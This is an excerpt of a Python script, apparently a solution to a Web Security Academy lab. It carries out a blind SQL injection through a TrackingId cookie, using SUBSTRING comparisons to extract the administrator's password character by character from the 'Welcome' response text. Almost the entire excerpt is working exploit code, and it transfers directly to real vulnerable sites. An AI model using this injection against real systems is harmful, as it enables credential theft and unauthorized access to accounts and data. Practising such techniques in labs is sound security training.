...
if not args.target:
    ...
    print("[*] Example usage: sqli-09.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)
...
password = ""
found = False
found_text = b"Welcome"
while not found:
    print(f"[*] Password so far: {password}")
    for char in char_list:
        payload = trackingID + "' AND SUBSTRING((SELECT password FROM users where username = 'administrator')," + str((len(password) + 1)) + ",1) = '" + str(char)
        cookies = {'TrackingId': payload, 'session': sessionID}
        print(f"[*] Trying: {char}")
        r = requests.get(args.target, cookies=cookies)
        if r.status_code == 200:
            if found_text in r.content:
                password += str(char)
